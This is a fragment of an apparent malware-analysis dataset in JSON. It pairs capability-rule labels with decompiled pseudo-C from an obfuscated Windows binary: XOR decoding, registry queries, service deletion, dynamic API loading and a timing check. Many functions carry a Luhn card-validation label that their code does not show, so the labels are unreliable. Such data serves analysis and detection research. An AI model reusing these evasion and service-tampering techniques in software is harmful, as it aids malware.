    },
    "00403aa0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid fcn.00403aa0(uint param_1)\n\n{\n    uint uStack48;\n    uint uStack44;\n    code *pcStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack48 = 0x30;\n    uStack44 = 3;\n    pcStack40 = fcn.00402ca0;\n    uStack36 = 0;\n    uStack32 = 0;\n    uStack28 = param_1;\n    uStack24 = 0;\n    uStack20 = 0;\n    uStack16 = 0;\n    uStack12 = 0;\n    uStack8 = 0x410544;\n    uStack4 = 0;\n    (*_sym.imp.USER32.dll_RegisterClassExA)(&uStack48);\n    return;\n}\n",
        "token_count": 218
    },
    "004044a0": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x004045d6) overlaps instruction at (ram,0x004045d4)\n// \n// WARNING: Removing unreachable block (ram,0x004045d6)\n// WARNING: Removing unreachable block (ram,0x004044d5)\n\nuint __cdecl fcn.004044a0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    uint8_t uVar1;\n    uchar uVar2;\n    uint *puVar3;\n    uint8_t *puVar4;\n    int32_t iVar5;\n    int32_t extraout_ECX;\n    uchar *puVar6;\n    uint *puVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    uint *puVar10;\n    bool bVar11;\n    char cVar12;\n    char cVar13;\n    ulong uVar14;\n    uint8_t var_20h;\n    uint var_1fh;\n    \n    puVar6 = &stack0xfffffffc;\n    puVar3 = fcn.00404110(arg_18h, arg_1ch, 0x41058c, 7);\n    if (puVar3 != NULL) {\n        var_20h = 0;\n        puVar7 = &var_1fh;\n        for (iVar5 = 7; iVar5 != 0; iVar5 = iVar5 + -1) {\n            *puVar7 = 0;\n            puVar7 = puVar7 + 1;\n        }\n        *puVar7 = 0;\n        *(puVar7 + 2) = 0;\n        uVar8 = 0;\n        do {\n            uVar14 = (*_sym.imp.MSVCRT.dll_rand)();\n            (&var_20h)[uVar8] = uVar14;\n            uVar9 = uVar8 + 1;\n            cVar13 = SBORROW4(uVar9, 0x20);\n            cVar12 = uVar8 - 0x1f < 0;\n            bVar11 = (POPCOUNT(uVar8 - 0x1f & 0xff) & 1U) == 0;\n            uVar8 = uVar9;\n        } while (uVar9 < 0x20);\n        if ((bVar11) || (!bVar11)) {\n            iVar5 = 8;\n        }\n        else {\n            puVar4 = (uVar14 >> 0x20) + 1;\n            puVar6 = *0xb917b43a;\n            uVar1 = puVar4;\n            *puVar4 = *puVar4 | uVar1;\n            cVar13 = SCARRY1(*puVar4, uVar1);\n            *puVar4 = *puVar4 + uVar1;\n            cVar12 = *puVar4 < '\\0';\n            iVar5 = extraout_ECX;\n        }\n        puVar7 = puVar6 + -0x20;\n        puVar10 = puVar3;\n        for (; iVar5 != 0; iVar5 = iVar5 + -1) {\n            *puVar10 = *puVar7;\n            puVar7 = puVar7 + 1;\n            puVar10 = puVar10 + 1;\n        }\n        uVar2 = fcn.004027e0(*(puVar6 + 8), *(puVar6 + 0xc), *(puVar6 + 0x10), *(puVar6 + 0x14), puVar6 + -0x20, 0x20, \n                             puVar3);\n        if ((cVar13 == cVar12) && (cVar13 != cVar12)) {\n            *(puVar10 | puVar6) = uVar2;\n        }\n        fcn.00401390(*(puVar6 + 0x18), *(puVar6 + 0x1c));\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 895
    },
    "00401000": {
        "rules": [
            "get user security identifier"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004010c0) overlaps instruction at (ram,0x004010bf)\n// \n// WARNING: Type propagation algorithm not settling\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nchar ** __cdecl fcn.00401000(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    char **ppcVar2;\n    int32_t iVar3;\n    int32_t unaff_EDI;\n    bool bVar4;\n    ulong uVar5;\n    uint var_31ch;\n    uint var_218h;\n    uint var_114h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    // [00] -r-x section size 16384 named .text\n    func_0x10186f9e();\n    func_0x51401033();\n    iVar1 = (*_sym.imp.ADVAPI32.dll_GetUserNameA)();\n    if (iVar1 == 0) {\n        return NULL;\n    }\n    uVar5 = (*_sym.imp.ADVAPI32.dll_LookupAccountNameA)();\n    iVar1 = uVar5;\n    if (iVar1 != 0) {\n        if ((iVar1 < 1) || (iVar3 = uVar5 >> 0x20,  0 < iVar1)) {\n            iVar3 = arg_8h;\n        }\n        (**(iVar3 + 0x50))();\n        ppcVar2 = (*_sym.imp.ADVAPI32.dll_ConvertSidToStringSidA)();\n        bVar4 = (POPCOUNT(ppcVar2 & 0xff) & 1U) == 0;\n        if (ppcVar2 != NULL) {\n            if ((bVar4) || (!bVar4)) {\n                ppcVar2 = 0x1;\n            }\n            else {\n                *(unaff_EDI + 0x5f) = *(unaff_EDI + 0x5f) + 0x48;\n                *ppcVar2 = *ppcVar2 + ppcVar2;\n                *ppcVar2 = *ppcVar2 + ppcVar2;\n            }\n            return ppcVar2;\n        }\n        return NULL;\n    }\n    return NULL;\n}\n",
        "token_count": 507
    },
    "00401390": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00401390(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = fcn.00402e60(arg_8h, arg_ch, &var_8h, &var_4h);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    *(iVar1 + 0x58) = var_4h;\n    fcn.00402e60(arg_8h, arg_ch, &var_8h, &var_4h);\n    return 1;\n}\n",
        "token_count": 161
    },
    "00401420": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00401420(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n    return iVar1 % 5 + 3;\n}\n",
        "token_count": 48
    },
    "00401450": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401452) overlaps instruction at (ram,0x00401451)\n// \n\nvoid __cdecl fcn.00401450(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    uint32_t in_ECX;\n    uint8_t uVar1;\n    int32_t iVar2;\n    uint8_t uVar3;\n    int32_t iVar4;\n    \n    do {\n        iVar4 = 0;\n        if (arg_14h < 1) {\n            return;\n        }\n        while( true ) {\n            iVar2 = iVar4 % arg_ch;\n            uVar3 = *(iVar4 + arg_10h) ^ *(iVar2 + arg_8h);\n            uVar1 = iVar2 & uVar3;\n            if (('\\0' < uVar1) && (uVar1 < '\\x01')) break;\n            uVar3 = arg_14h ^ uVar3;\n            in_ECX = in_ECX & 0xffffff00 | uVar3;\n            *(iVar4 + arg_10h) = uVar3;\n            iVar4 = iVar4 + 1;\n            if (arg_14h <= iVar4) {\n                return;\n            }\n        }\n        if (in_ECX != 0) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n        in(iVar2);\n    } while( true );\n}\n",
        "token_count": 332
    },
    "004014f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401700) overlaps instruction at (ram,0x004016ff)\n// \n// WARNING: Removing unreachable block (ram,0x00401572)\n\nuint * __fastcall fcn.004014f0(uint param_1, uint param_2, uint32_t *param_3)\n\n{\n    char cVar1;\n    uint16_t uVar2;\n    uint32_t *in_EAX;\n    char *pcVar3;\n    uint *puVar4;\n    uint32_t uVar5;\n    uint8_t uVar6;\n    uint32_t unaff_EBX;\n    uint *puVar7;\n    uchar *puVar8;\n    uchar *puVar9;\n    uint32_t *unaff_ESI;\n    uint32_t *puVar10;\n    uint32_t *puVar11;\n    uint32_t **unaff_EDI;\n    uint32_t **ppuVar12;\n    ushort in_SS;\n    bool bVar13;\n    bool bVar14;\n    bool bVar15;\n    float10 in_ST0;\n    float10 in_ST1;\n    float10 in_ST2;\n    float10 in_ST3;\n    float10 in_ST4;\n    float10 in_ST5;\n    float10 in_ST6;\n    float10 in_ST7;\n    double in_stack_46c692c5;\n    uint uStack20;\n    ushort uStack12;\n    ushort uStack10;\n    ushort uStack8;\n    ushort uStack6;\n    \n    puVar4 = &stack0xfffffffc;\n    puVar9 = &stack0xfffffffc;\n    uStack8 = unaff_EBX;\n    uStack6 = unaff_EBX >> 0x10;\n    uStack12 = SUB42(unaff_ESI, 0);\n    uStack10 = unaff_ESI >> 0x10;\n    *param_3 = '\\0';\n    *(param_3 + 1) = 'M';\n    cVar1 = param_2 >> 8;\n    bVar15 = false;\n    uVar6 = param_1 >> 8 ^ unaff_EBX;\n    bVar14 = uVar6 << 8 < 0;\n    bVar13 = uVar6 == 0;\n    *(param_3 + 2) = '\\b';\n    if ((bVar13 || bVar14) || (!bVar13 && !bVar14)) {\n        *(param_3 + 3) = -0x1b;\n    }\n    else {\n        in_ST0 = in_ST0 - in_stack_46c692c5;\n        bVar15 = SCARRY4(&uStack12, &stack0xfffffffc);\n        bVar14 = &uStack12 < 0;\n        bVar13 = *0x10 == 0xc;\n    }\n    uVar6 = unaff_EBX >> 8;\n    ppuVar12 = unaff_EDI;\n    if ((bVar15 == bVar14) && (bVar15 != bVar14)) {\n        out(0xc4, in_EAX);\n        ppuVar12 = unaff_EDI + 1;\n        *unaff_EDI = in_EAX;\n        bVar15 = SBORROW1(uVar6, *in_EAX);\n        bVar14 = uVar6 - *in_EAX < '\\0';\n        bVar13 = uVar6 == *in_EAX;\n    }\n    *(param_3 + 1) = 'O';\n    if ((((!bVar13 && bVar15 == bVar14) && (bVar13 || bVar15 != bVar14)) || (*(param_3 + 5) = -0x7e,  !bVar14)) &&\n       (in_ST0 = in_ST0 - in_stack_46c692c5,  pcVar3 = in_EAX + 0x500f7882,  in_EAX = unaff_ESI,  pcVar3 < 0)) {\n        *(ppuVar12 + 7) = in_ST0;\n        ppuVar12 = ppuVar12 + 5;\n        param_3 = param_3 + 5;\n        in_ST0 = in_ST1;\n        in_ST1 = in_ST2;\n        in_ST2 = in_ST3;\n        in_ST3 = in_ST4;\n        in_ST4 = in_ST5;\n        in_ST5 = in_ST6;\n        in_ST6 = in_ST7;\n    }\n    *(param_3 + 6) = 'H';\n    *(param_3 + 7) = -0x38;\n    uVar6 = uVar6 ^ 0x16 | in_EAX >> 8;\n    bVar13 = uVar6 - cVar1 == '\\0';\n    *(param_3 + 2) = -3;\n    if (((cVar1 <= uVar6) && (uVar6 < cVar1)) || (*(param_3 + 9) = -0x50,  (POPCOUNT(uVar6 - cVar1) & 1U) != 0)) {\n        puVar10 = in_EAX + 1;\n        puVar11 = param_3 + -0x2474e586;\n        *puVar11 = *puVar11 | puVar10;\n        bVar13 = *puVar11 == 0;\n        unaff_EBX = unaff_EBX & 0xffff;\n        in_EAX = param_3;\n        param_3 = puVar10;\n        if ((POPCOUNT(*puVar11 & 0xff) & 1U) == 0) {\n            puVar7 = &stack0xfffffff0;\n            cVar1 = '\\x1e';\n            do {\n                puVar4 = puVar4 + -1;\n                puVar7 = puVar7 + -1;\n                *puVar7 = *puVar4;\n                cVar1 = cVar1 + -1;\n            } while ('\\0' < cVar1);\n            puVar4 = in(0x78);\n            return puVar4;\n        }\n    }\n    *(param_3 + 10) = 'R';\n    puVar8 = &stack0xfffffffc;\n    puVar11 = param_3;\n    if (bVar13) goto code_r0x00401634;\n    do {\n        puVar8 = puVar9;\n        puVar11 = param_3;\n        if (bVar13) {\n            ppuVar12 = CONCAT22(uStack8, in_SS);\n            uStack12 = 0x47;\n            uStack10 = 0;\n            puVar11 = param_3 | *in_EAX;\n        }\n        else {\ncode_r0x00401634:\n            *(puVar11 + 0xb) = '0';\n        }\n        bVar13 = -1 < (in_EAX ^ unaff_EBX);\n        *(puVar11 + 3) = '{';\n        if ((bVar13) && (!bVar13)) {\n            *(ppuVar12 + 7) = in_ST0;\n            ppuVar12 = ppuVar12 + 5;\n            puVar11 = puVar11 + 5;\n            in_ST0 = in_ST1;\n            in_ST1 = in_ST2;\n            in_ST2 = in_ST3;\n            in_ST3 = in_ST4;\n            in_ST4 = in_ST5;\n            in_ST5 = in_ST6;\n            in_ST6 = in_ST7;\n        }\n        *(puVar11 + 0xd) = 'X';\n        *(puVar11 + 0xe) = '2';\n        uVar2 = (CONCAT11(((in_EAX >> 8) - unaff_EBX) + 'M', in_EAX) & 0x26ae) - 1;\n        bVar14 = uVar2 == 0;\n        bVar13 = (POPCOUNT(uVar2 & 0xff) & 1U) == 0;\n        *(puVar11 + 0xf) = 'D';\n        param_3 = puVar11;\n        if ((bVar13) || (!bVar13)) goto code_r0x004016ad;\n        param_3 = *ppuVar12;\n        *ppuVar12 = puVar11;\n        puVar9 = puVar8 + -*(puVar8 + 0x5f9dff63);\n        bVar13 = puVar9 == NULL;\n    } while (puVar9 < 0);\n    bVar14 = param_3 == NULL;\n    bVar13 = (POPCOUNT(param_3 & 0xff) & 1U) == 0;\n    if (-1 < param_3) goto code_r0x004016f0;\ncode_r0x004016ad:\n    uVar5 = CONCAT31(in_EAX >> 8, 0x61);\n    *(param_3 + 4) = 'a';\n    if ((!bVar14) && (bVar14)) {\n        uVar5 = uVar5 & 0xe2f4cc58;\n        bVar14 = uVar5 == 0;\n        bVar13 = false;\n    }\n    *(param_3 + 0x11) = -0x7e;\n    if ((bVar13) || (!bVar13)) {\n        *(param_3 + 0x12) = uVar5;\n        if (!bVar14) goto code_r0x004016d7;\n    }\n    else {\n        puVar11 = uVar5 + 0xf741246;\n        *puVar11 = *puVar11 | 0x66;\n        bVar14 = *puVar11 == 0;\ncode_r0x004016d7:\n        if (bVar14) {\n            uStack12 = 0x47;\n            uStack10 = 0;\n            goto code_r0x004016f0;\n        }\n    }\n    *(param_3 + 0x13) = -0x13;\ncode_r0x004016f0:\n    puVar4 = func_0x10187672();\n    *puVar4 = 0x14;\n    return puVar4;\n}\n",
        "token_count": 2222
    },
    "00401710": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040177c) overlaps instruction at (ram,0x0040177b)\n// \n// WARNING: Removing unreachable block (ram,0x0040177c)\n\nvoid __cdecl fcn.00401710(uint *arg_8h, uint *arg_ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    char cVar4;\n    char cVar5;\n    uchar var_68h;\n    uint var_67h;\n    uint var_4h;\n    \n    var_4h = 0;\n    var_68h = 0;\n    puVar3 = &var_67h;\n    for (iVar2 = 0x18; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    *(puVar3 + 2) = 0;\n    cVar5 = '\\0';\n    cVar4 = '\\0';\n    uVar1 = fcn.004014f0(&var_68h, &var_4h);\n    if ((cVar5 == cVar4) && (cVar5 != cVar4)) {\n        out(0xc4, uVar1);\n        *(puVar3 + 3) = uVar1;\n    }\n    fcn.00404080(&var_68h, var_4h, 0x406020, 0xa520);\n    *arg_8h = 0x406020;\n    *arg_ch = 0xa520;\n    return;\n}\n",
        "token_count": 369
    },
    "004017b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create or open file",
            "contain loop",
            "write file on Windows"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401805) overlaps instruction at (ram,0x00401801)\n// \n// WARNING: Control flow encountered bad instruction data\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.004017b0(uint *filename, uint *mode, uint ptr, uint nitems)\n\n{\n    uint32_t *puVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t extraout_ECX;\n    uint unaff_EBP;\n    int32_t *unaff_EDI;\n    bool bVar4;\n    bool bVar5;\n    char cVar6;\n    char cVar7;\n    ulong uVar8;\n    uint unaff_retaddr;\n    uchar auStack108 [76];\n    uint uStack32;\n    uint uStack28;\n    uchar uStack24;\n    uchar uStack23;\n    ushort uStack22;\n    uint uStack20;\n    uint uStack16;\n    \n    uStack24 = 0xc3;\n    uStack23 = 0x17;\n    uStack22 = 0x40;\n    uStack16 = mode;\n    uStack20 = filename;\n    iVar3 = (*_sym.imp.MSVCRT.dll_fopen)();\n    if (iVar3 == 0) {\n        return 0;\n    }\n    while( true ) {\n        uStack16._0_2_ = iVar3;\n        uStack16._2_2_ = iVar3 >> 0x10;\n        uStack24 = 1;\n        uStack23 = 0;\n        uStack22 = 0;\n        uStack28 = ptr;\n        uStack32 = 0x4017f6;\n        uStack20 = nitems;\n        (*_sym.imp.MSVCRT.dll_fwrite)();\n        puVar1 = iVar3 + 0x43d1773a;\n        bVar4 = false;\n        cVar7 = '\\0';\n        *puVar1 = *puVar1 ^ 0x5627e95e;\n        cVar6 = *puVar1 < 0;\n        bVar5 = *puVar1 == 0;\n        uStack32 = 0x401816;\n        uVar8 = (*_sym.imp.MSVCRT.dll_fflush)();\n        if (((bVar4) || (!bVar4)) || (extraout_ECX == 1 || bVar5 == false)) {\n            *unaff_EDI = iVar3 + 4;\n            (*_sym.imp.MSVCRT.dll_fclose)();\n            return 1;\n        }\n        if (cVar7 != cVar6) {\n            uStack16._0_2_ = 0x1792;\n            uStack16._2_2_ = 0x40;\n            uVar2 = fcn.00404080(&stack0xffffff94, uVar8 >> 0x20, unaff_EBP, unaff_retaddr);\n            *filename = 0x406020;\n            *mode = 0xa520;\n            return uVar2;\n        }\n        if (bVar4 || bVar5) break;\n        *uVar8 = *uVar8 + uVar8;\n    }\n    // WARNING: Bad instruction - Truncating control flow here\n    halt_baddata();\n}\n",
        "token_count": 715
    },
    "004022c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.004022c0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    uint32_t in_EAX;\n    int32_t iVar1;\n    bool in_CF;\n    uint hKey;\n    \n    if ((!in_CF) && (in_CF)) {\n        out(0xbd, in_EAX);\n        return in_EAX;\n    }\n    iVar1 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExA)(arg_8h, arg_ch, 0, 0xf003f, &hKey);\n    if (iVar1 != 0) {\n        return 0;\n    }\n    iVar1 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExA)(hKey, arg_10h, 0, arg_14h, arg_18h, arg_1ch);\n    (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n    return iVar1 == 0;\n}\n",
        "token_count": 232
    },
    "00402480": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004025fa) overlaps instruction at (ram,0x004025f5)\n// \n// WARNING: Removing unreachable block (ram,0x004024d3)\n// WARNING: Removing unreachable block (ram,0x004024b8)\n// WARNING: Removing unreachable block (ram,0x004024d5)\n\nuint fcn.00402480(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint8_t extraout_CL;\n    uint8_t uVar4;\n    ushort extraout_CX;\n    char extraout_DL;\n    char extraout_DL_00;\n    char extraout_DL_01;\n    char cVar5;\n    uint32_t unaff_EBP;\n    code *pcVar6;\n    ushort in_SS;\n    bool bVar7;\n    \n    pcVar1 = _sym.imp.KERNEL32.dll_LoadLibraryA;\n    if (*0x420a7c != 0) {\n        return 1;\n    }\n    iVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0x4106b4);\n    pcVar6 = _sym.imp.KERNEL32.dll_GetProcAddress;\n    if (iVar2 == 0) {\n        return 0;\n    }\n    *0x420a6c = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, 0x4106c0);\n    if (*0x420a6c == 0) {\n        return 0;\n    }\n    iVar2 = (*pcVar1)(0xcc);\n    if (iVar2 == 0) {\n        return 0;\n    }\n    *0x420a74 = (*pcVar6)(iVar2, 0xd8);\n    if (*0x420a74 == 0) {\n        return 0;\n    }\n    iVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0x4106e4);\n    if (iVar2 == 0) {\n        return 0;\n    }\n    if ((iVar2 < 0) || (iVar2 >= 0)) {\n        *0x420a70 = (*pcVar6)(iVar2, 0x4106f0);\n    }\n    else {\n        *(iVar2 + -1) = *(iVar2 + -1) + extraout_DL;\n        *0x420a70 = iVar2 + 0x4106f068U & 0xffffff00 | pcVar1[iVar2 + 0x4106f068U & 0xff];\n    }\n    pcVar6 = _sym.imp.KERNEL32.dll_GetProcAddress;\n    if (*0x420a70 == 0) {\n        return 0;\n    }\n    *0x420a64 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, 0x410700);\n    bVar7 = *0x420a64 == 0;\n    if (bVar7) {\n        return 0;\n    }\n    if ((bVar7) || (!bVar7)) {\n        uVar3 = (*pcVar6)(iVar2, 0x410714);\n        uVar4 = extraout_CL;\n        cVar5 = extraout_DL_01;\n    }\n    else {\n        pcVar6 = CONCAT22(extraout_CX, in_SS);\n        uVar4 = extraout_CX + 1;\n        *(iVar2 + -1) = *(iVar2 + -1) + extraout_DL_00;\n        uVar3 = *pcVar1;\n        cVar5 = extraout_DL_00;\n    }\n    if (uVar3 != 0) {\n        *0x420a68 = uVar3;\n        if ((uVar3 < 1) || (0 < uVar3)) {\n            *0x420a78 = (*pcVar6)(iVar2, 0x410728);\n        }\n        else {\n            *(uVar3 + 0x6839da56) = *(uVar3 + 0x6839da56) ^ uVar4;\n            *pcVar6 = *pcVar6 - uVar3;\n            *(iVar2 + -1) = *(iVar2 + -1) + cVar5;\n            *0x420a78 = uVar3 & 0xffffff00 | pcVar1[(uVar3 & 0xff) + 1];\n        }\n        if (*0x420a78 != 0) {\n            if ((-1 < *0x420a78) && (-1 >= *0x420a78)) {\n                *(pcVar6 | unaff_EBP) = *0x420a78;\n            }\n            *0x420a7c = 1;\n            return 1;\n        }\n        return 0;\n    }\n    *0x420a68 = uVar3;\n    return 0;\n}\n",
        "token_count": 1058
    },
    "004026a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004026a0(void)\n\n{\n    uint uVar1;\n    \n    if (*0x420a84 == 0) {\n        uVar1 = (*_sym.imp.MSVCRT.dll_time)(0);\n        (*_sym.imp.MSVCRT.dll_srand)(uVar1);\n        *0x420a84 = 1;\n    }\n    return;\n}\n",
        "token_count": 84
    },
    "004026f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040275a) overlaps instruction at (ram,0x00402759)\n// \n\nuint fcn.004026f0(void)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    char extraout_DL;\n    int32_t unaff_EBX;\n    uchar uVar5;\n    uchar uVar6;\n    int32_t iStack28;\n    uint uStack24;\n    int32_t iStack20;\n    uint uStack16;\n    uint uStack12;\n    \n    uStack12 = 0x41063c;\n    uStack16 = 0x4026ff;\n    iVar3 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)();\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcAddress;\n    uVar5 = 0;\n    uVar6 = iVar3 == 0;\n    if (uVar6) {\n        return 0;\n    }\n    uStack16 = 0x41064c;\n    uStack24 = 0x402723;\n    iStack20 = iVar3;\n    *0x420a88 = (*_sym.imp.KERNEL32.dll_GetProcAddress)();\n    uStack24 = 0x410668;\n    iStack28 = iVar3;\n    uVar4 = (*pcVar2)();\n    *0x420a8c = uVar4;\n    if ((uVar5 || uVar6) || (!uVar5 && !uVar6)) {\n        *0x420a90 = (*pcVar2)(iVar3, 0x410678);\n    }\n    else {\n        piVar1 = pcVar2 + 0x68;\n        *piVar1 = *piVar1 - &stack0xffffffe4;\n        if (*piVar1 < 0) {\n            *0x420a90 = uVar4 | 0x420a88;\n        }\n        else {\n            *(iVar3 + -1) = *(iVar3 + -1) + extraout_DL;\n            *0x420a90 = uVar4 & 0xffffff00 | *(unaff_EBX + (uVar4 & 0xff));\n        }\n    }\n    if (((*0x420a88 != 0) && (*0x420a8c != 0)) && (*0x420a90 != 0)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 539
    },
    "004029a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool __cdecl fcn.004029a0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.004010d0(arg_8h, 1);\n    return iVar1 != 0;\n}\n",
        "token_count": 54
    },
    "00402a60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402a9a) overlaps instruction at (ram,0x00402a98)\n// \n\nint32_t __cdecl fcn.00402a60(uint32_t arg_8h, uint32_t arg_ch)\n\n{\n    uint32_t uVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t in_ECX;\n    uint8_t uVar3;\n    uint32_t in_EDX;\n    uint32_t uVar4;\n    \n    uVar4 = 0;\n    uVar1 = arg_ch;\n    if (arg_ch != 0) {\n        do {\n            if ((uVar1 < 0) || (uVar1 >= 0)) {\n                iVar2 = (*_sym.imp.MSVCRT.dll_rand)();\n                in_ECX = 0x1a;\n                in_EAX = iVar2 / 0x1a;\n                in_EDX = iVar2 % 0x1a;\n            }\n            else {\n                in_EAX = in_EAX + 0x50b81600;\n                *(in_ECX + 0x1ab9) = *(in_ECX + 0x1ab9) + arg_8h;\n                arg_8h = arg_8h & 0xffff0000 | CONCAT11((arg_8h >> 8) + (in_EDX >> 8), arg_8h);\n            }\n            uVar3 = in_EDX + 0x61;\n            in_EDX = in_EDX & 0xffffff00 | uVar3;\n            *(uVar4 + arg_8h) = uVar3;\n            uVar4 = uVar4 + 1;\n            uVar1 = uVar4 - arg_ch;\n        } while (uVar4 < arg_ch);\n    }\n    return in_EAX;\n}\n",
        "token_count": 408
    },
    "00402df0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402e4a) overlaps instruction at (ram,0x00402e41)\n// \n\nuint __fastcall fcn.00402df0(uint32_t param_1, char param_2, uint32_t param_3, uint32_t param_4)\n\n{\n    uint8_t *puVar1;\n    char *pcVar2;\n    uint32_t in_EAX;\n    int32_t iVar3;\n    uint uVar4;\n    uint32_t uVar5;\n    uint16_t in_SS;\n    bool in_ZF;\n    uint32_t in_stack_ffffffe4;\n    int32_t *piVar6;\n    \n    if ((in_ZF) || (uVar5 = (param_1 >> 8 & 0xffff00) << 8 | param_1 & 0xffff,  !in_ZF)) {\n        in_EAX = param_4;\n        uVar5 = param_3;\n    }\n    piVar6 = in_stack_ffffffe4 & 0xffff0000 | in_SS;\n    puVar1 = (in_EAX | 0x8b) - 1;\n    *puVar1 = *puVar1 | uVar5 >> 8;\n    *piVar6 = *piVar6 + uVar5;\n    pcVar2 = (in_EAX | 0x8b) + 0x51;\n    *pcVar2 = *pcVar2 + param_2;\n    iVar3 = (*_sym.imp.ADVAPI32.dll_OpenServiceA)(0x47);\n    if (iVar3 != 0) {\n        uVar4 = (*_sym.imp.ADVAPI32.dll_DeleteService)(iVar3);\n        *(iVar3 + 0x43d1773a) = *(iVar3 + 0x43d1773a) ^ 0x5627e95e;\n        (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)();\n        return uVar4;\n    }\n    return 0;\n}\n",
        "token_count": 441
    },
    "00403b00": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
